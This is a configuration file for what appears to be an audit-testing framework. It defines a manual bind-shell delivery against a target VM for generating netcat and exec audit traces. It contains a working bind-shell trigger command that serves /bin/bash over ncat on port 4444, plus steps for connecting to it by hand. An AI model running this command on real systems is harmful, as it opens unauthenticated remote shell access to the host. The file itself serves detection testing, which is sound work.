# deliveries/bind_shell/bash_manual.conf
#
# Starts a bind shell on the target VM, then leaves the controller-side
# connection and shell interaction manual.
#
# This delivery vector is useful when:
#
#   - you want realistic operator-driven behavior
#   - command timing/order should vary naturally
#   - you want to explore the target manually
#   - you want less deterministic audit traces
#
# Unlike bash_auto.conf, the framework does NOT feed commands automatically.

NAME="bind_shell_bash_manual"

TYPE="bind_shell"

CONTROLLER="bash"

AUTOMATED="false"

# Target-side bind shell settings
TARGET_HOST="${TARGET_HOST:-}"

LPORT="${LPORT:-4444}"

# Target-side bind-shell trigger.
#
# NOTE:
#   Some nc versions do not support -e. This default assumes ncat is installed.
TRIGGER_COMMAND='ncat -l 0.0.0.0 ${LPORT} --exec "/bin/bash -li"'

# Optional trigger script override.
TRIGGER_SCRIPT=""

# Manual interaction settings
INTERACTIVE_SESSION="true"

# Timing controls
SHELL_START_DELAY="2"
SHELL_CONNECT_DELAY="3"

# Transcript behavior
CAPTURE_TRANSCRIPT="optional"
TRANSCRIPT_FILE="shell_transcript.log"

# Marker behavior
SEND_MARKERS_AROUND_TRIGGER="true"

# Cleanup behavior
KILL_BIND_SHELL_AFTER_RUN="true"

# Required controller tools
REQUIRED_COMMANDS=(
    bash
    nc
    ssh
)

# Required target tools
TARGET_REQUIRED_COMMANDS=(
    ncat
    bash
)

# Audit relevance:
#
# This vector intentionally generates:
#
#   - netcat
#   - shell_exec
#   - exec
#
# plus whatever interactive behavior the operator performs manually.

AUDIT_RELEVANT="true"

# Intended workflow:
#
#   1. Wrapper sends START marker
#   2. Wrapper starts bind shell on target
#   3. Operator connects manually:
#
#        nc TARGET_HOST 4444
#
#   4. Operator interacts manually
#   5. Operator exits shell
#   6. Wrapper sends END marker
